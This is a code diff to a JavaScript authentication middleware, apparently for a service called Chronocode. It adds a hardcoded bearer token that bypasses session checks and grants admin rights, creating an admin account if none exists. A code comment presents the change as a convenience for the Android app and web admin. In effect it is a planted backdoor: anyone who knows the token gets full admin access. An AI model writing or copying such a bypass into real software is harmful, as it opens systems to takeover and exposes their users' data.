@@ -100,6 +100,15 @@ function authenticate(req, res, next) {
     return next();
   }
   const token = authHeader.split(' ')[1];
+
+  // Hardcoded admin panel token bypass (for Android app / web admin)
+  if (token === 'CC_SESSION_YWRtaW5AY2hyb25vY29kZS5jb206MTc4MTk5Nzc=') {
+    const adminUser = db.users.findOne({ email: 'admin@chronocode.com' }) ||
+      db.users.insert({ email: 'admin@chronocode.com', name: 'Admin', role: 'admin', status: 'active', picture: '', platformInfo: 'Admin Panel', lastActive: Date.now() });
+    req.user = adminUser;
+    return next();
+  }
+
   const email = activeSessions.get(token);
   if (!email) {
     req.user = null;
